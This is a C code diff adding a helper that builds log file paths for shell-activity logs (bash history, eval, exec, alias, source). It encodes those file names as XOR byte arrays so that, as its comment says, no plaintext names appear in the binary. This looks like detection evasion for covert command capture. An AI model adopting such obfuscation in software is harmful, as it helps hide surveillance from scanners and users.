@@ -113,6 +113,58 @@ static inline void build_log_path(char *out, int sz, int token) {
     }
 }
 
+/*
+ * Fills `out` with base_dir + XOR-decoded /filename.log for the given token.
+ * token: 0=bash_history.log  1=eval.log  2=exec.log  3=alias.log  4=source.log
+ * Use LOG_BASE_PATH macro as the base_dir argument.
+ * No plaintext log filename strings are embedded; only XOR byte arrays appear.
+ */
+static inline void build_log_path_from_base(char *out, int sz, const char *base_dir, int token) {
+    /* Copy base directory first */
+    int blen = 0;
+    while (base_dir[blen] && blen < sz - 1) {
+        out[blen] = base_dir[blen];
+        blen++;
+    }
+    out[blen] = '\0';
+
+    switch (token) {
+        case 0: { /* /bash_history.log */
+            unsigned char e[] = {0x75,0x38,0x3b,0x29,0x32,0x05,0x32,0x33,0x29,
+                                 0x2e,0x35,0x28,0x23,0x74,0x36,0x35,0x3d,0x00};
+            _lp_decode(e, 17);
+            if (blen + 17 < sz) memcpy(out + blen, e, 18);
+            break;
+        }
+        case 1: { /* /eval.log */
+            unsigned char e[] = {0x75,0x3f,0x2c,0x3b,0x36,0x74,0x36,0x35,0x3d,0x00};
+            _lp_decode(e, 9);
+            if (blen + 9 < sz) memcpy(out + blen, e, 10);
+            break;
+        }
+        case 2: { /* /exec.log */
+            unsigned char e[] = {0x75,0x3f,0x22,0x3f,0x39,0x74,0x36,0x35,0x3d,0x00};
+            _lp_decode(e, 9);
+            if (blen + 9 < sz) memcpy(out + blen, e, 10);
+            break;
+        }
+        case 3: { /* /alias.log */
+            unsigned char e[] = {0x75,0x3b,0x36,0x33,0x3b,0x29,0x74,0x36,0x35,0x3d,0x00};
+            _lp_decode(e, 10);
+            if (blen + 10 < sz) memcpy(out + blen, e, 11);
+            break;
+        }
+        case 4: { /* /source.log */
+            unsigned char e[] = {0x75,0x29,0x35,0x2f,0x28,0x39,0x3f,0x74,0x36,0x35,0x3d,0x00};
+            _lp_decode(e, 11);
+            if (blen + 11 < sz) memcpy(out + blen, e, 12);
+            break;
+        }
+        default:
+            break;
+    }
+}
+
 #undef _LP_KEY_VAL
 
 #endif /* _LOG_PATH_HELPER_H_ */
